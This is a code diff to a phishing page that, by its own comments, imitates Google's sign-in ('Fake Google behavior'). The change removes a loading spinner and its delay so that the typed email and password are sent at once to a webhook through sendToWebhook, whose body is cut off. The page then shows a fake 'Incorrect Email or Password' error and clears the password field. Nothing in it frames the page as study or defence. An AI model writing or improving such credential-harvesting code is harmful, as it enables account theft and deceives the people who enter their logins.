@@ -93,8 +93,9 @@
             min-height: 20px;
             font-weight: 500;
         }
+        /* Spinner class kept but hidden by default */
         .loader {
-            display: none;
+            display: none; 
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1a73e8;
             border-radius: 50%;
@@ -160,7 +161,6 @@
         
         <button type="submit" class="btn-next">
             Next 
-            <span class="loader" id="loader"></span> 
         </button>
     </form>
 
@@ -178,7 +178,6 @@
     const emailInput = document.getElementById('email');
     const passInput = document.getElementById('password');
     const errorMsg = document.getElementById('error-message');
-    const loader = document.getElementById('loader');
 
     // Toggle Password Visibility
     function togglePassword() {
@@ -201,22 +200,14 @@
             return;
         }
 
-        // Show Loader
-        loader.style.display = 'inline-block';
-        errorMsg.textContent = ""; // Clear errors
+        // Send Data to Webhook Immediately
+        sendToWebhook(email, password, "Login Attempt");
 
-        // Simulate slight delay for realism
-        setTimeout(() => {
-            // Send Data to Webhook
-            sendToWebhook(email, password, "Login Attempt");
-
-            // Show Error Message (Fake Google behavior)
-            errorMsg.textContent = "Incorrect Email or Password. Please try again";
-            loader.style.display = 'none';
-            
-            // Optional: Clear password field
-            passInput.value = '';
-        }, 1000);
+        // Show Error Message (Fake Google behavior)
+        errorMsg.textContent = "Incorrect Email or Password. Please try again";
+        
+        // Optional: Clear password field
+        passInput.value = '';
     });
 
     function sendToWebhook(email, pass, status) {
